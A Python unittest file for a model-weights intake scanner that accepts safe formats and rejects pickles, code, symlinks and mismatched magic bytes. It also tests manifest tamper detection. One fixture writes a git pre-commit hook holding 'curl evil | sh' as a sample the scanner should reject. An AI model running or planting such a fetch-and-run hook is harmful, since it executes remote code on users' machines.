import json
import os
import struct
import tempfile
import unittest
from pathlib import Path

from silo import intake


def gguf(version=3) -> bytes:
    return b"GGUF" + struct.pack("<I", version) + b"\0" * 32


def safetensors(header: dict) -> bytes:
    raw = json.dumps(header).encode()
    return struct.pack("<Q", len(raw)) + raw + b"\0" * 16


class IntakeTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def put(self, name: str, data: bytes) -> Path:
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        return path

    def verdicts(self, **kw):
        return {v.path: v for v in intake.scan(self.root, **kw)}

    def test_accepts_safe_formats(self):
        self.put("m.gguf", gguf())
        self.put("shard-00001.safetensors", safetensors({"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}))
        self.put("config.json", b"{}")
        self.put("tokenizer.model", b"\x0a\x05hello")
        v = self.verdicts()
        self.assertTrue(all(x.ok for x in v.values()), v)

    def test_rejects_code_pickle_and_symlinks(self):
        self.put("modeling_custom.py", b"import os\n")
        self.put("pytorch_model.bin", b"\x80\x04" + b"x" * 20)
        self.put("model.pt", b"PK\x03\x04" + b"x" * 20)
        os.symlink("/etc/passwd", self.root / "tokenizer.json")
        v = self.verdicts()
        self.assertEqual(v["modeling_custom.py"].kind, "code")
        self.assertEqual(v["pytorch_model.bin"].kind, "pickle")
        self.assertEqual(v["model.pt"].kind, "pickle")
        self.assertEqual(v["tokenizer.json"].kind, "symlink")
        self.assertFalse(any(x.ok for x in v.values()))

    def test_magic_beats_extension(self):
        self.put("weights.gguf", b"PK\x03\x04" + b"\0" * 20)
        self.put("vocab.txt", b"\x7fELF" + b"\0" * 20)
        self.put("data.json", b"\x80\x05" + b"\0" * 20)
        v = self.verdicts()
        self.assertEqual({x.kind for x in v.values()}, {"magic"})

    def test_malformed_weights(self):
        self.put("bad-version.gguf", gguf(version=99))
        self.put("no-magic.gguf", b"GGML" + b"\0" * 40)
        self.put("huge-header.safetensors", struct.pack("<Q", 1 << 40) + b"{}")
        self.put("not-json.safetensors", struct.pack("<Q", 4) + b"\xff\xfe\x00\x01")
        self.assertFalse(any(x.ok for x in self.verdicts().values()))

    def test_hidden_directories_are_vetted_too(self):
        self.put("m.gguf", gguf())
        self.put(".cache/huggingface/download/m.gguf.metadata", b"abc\n")
        self.put(".git/hooks/pre-commit", b"#!/bin/sh\ncurl evil | sh\n")
        self.put(".hidden/payload.py", b"import os\n")
        os.symlink("/etc", self.root / ".linkdir")
        v = self.verdicts()
        self.assertEqual(set(v), {"m.gguf", ".cache/huggingface/download/m.gguf.metadata", ".git/hooks/pre-commit",
                                  ".hidden/payload.py", ".linkdir"})
        self.assertEqual([x.path for x in v.values() if x.ok], ["m.gguf"])
        self.assertEqual(v[".linkdir"].kind, "symlink")
        # --allow-unknown relaxes extensions only: scripts, code and symlinks stay out
        relaxed = self.verdicts(allow_unknown=True)
        self.assertTrue(relaxed[".cache/huggingface/download/m.gguf.metadata"].ok)
        self.assertFalse(relaxed[".git/hooks/pre-commit"].ok)
        self.assertFalse(relaxed[".hidden/payload.py"].ok)
        self.assertFalse(relaxed[".linkdir"].ok)

    def test_unknown_extension(self):
        self.put("weights.xyz", b"data")
        self.assertFalse(self.verdicts()["weights.xyz"].ok)
        self.assertTrue(self.verdicts(allow_unknown=True)["weights.xyz"].ok)

    def test_manifest_roundtrip_and_tamper_detection(self):
        self.put("m.gguf", gguf())
        self.put("config.json", b"{}")
        manifest_path = self.root.parent / f"{self.root.name}-manifest.json"
        try:
            intake.write_manifest(intake.build_manifest(self.root, intake.scan(self.root), progress=False),
                                  manifest_path)
            self.assertEqual(oct(manifest_path.stat().st_mode & 0o777), "0o600")
            self.assertEqual(intake.verify(self.root, manifest_path), [])

            # same size, new content, mtime preserved: only a full verify can see it
            path = self.root / "m.gguf"
            st = path.stat()
            path.write_bytes(gguf()[:-1] + b"\x01")
            os.utime(path, ns=(st.st_atime_ns, st.st_mtime_ns))
            self.assertEqual(intake.verify(self.root, manifest_path), [])
            self.assertIn("m.gguf: SHA-256 mismatch", intake.verify(self.root, manifest_path, full=True))

            self.put("extra.gguf", gguf())
            self.assertIn("unmanifested file: extra.gguf", intake.verify(self.root, manifest_path))
            (self.root / "config.json").unlink()
            self.assertIn("missing file: config.json", intake.verify(self.root, manifest_path))
        finally:
            manifest_path.unlink(missing_ok=True)

    def test_verify_without_manifest(self):
        problems = intake.verify(self.root, self.root / "nope.json")
        self.assertEqual(len(problems), 1)
        self.assertIn("silo intake", problems[0])


if __name__ == "__main__":
    unittest.main()
